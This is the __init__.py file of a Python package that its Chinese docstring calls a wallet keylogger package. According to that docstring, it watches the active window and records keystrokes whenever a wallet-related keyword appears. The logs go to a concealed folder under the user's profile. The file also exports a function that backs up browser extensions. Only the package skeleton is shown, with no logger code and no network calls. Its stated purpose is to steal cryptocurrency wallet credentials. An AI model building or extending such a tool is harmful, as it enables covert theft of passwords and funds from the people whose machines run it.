"""
钱包键盘记录器包 (Wallet Keylogger Package)

持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 %USERPROFILE%\.dev\wkler\recording_{日期}.log
"""

__version__ = "0.2.3"
__author__ = "YLX-STUDIO"

from .logger import KeyLogger, create_log_file
from .backup import backup_browser_extensions
from .detectors import get_active_window_name

__all__ = [
    "__version__",
    "KeyLogger",
    "create_log_file",
    "backup_browser_extensions",
    "get_active_window_name",
]
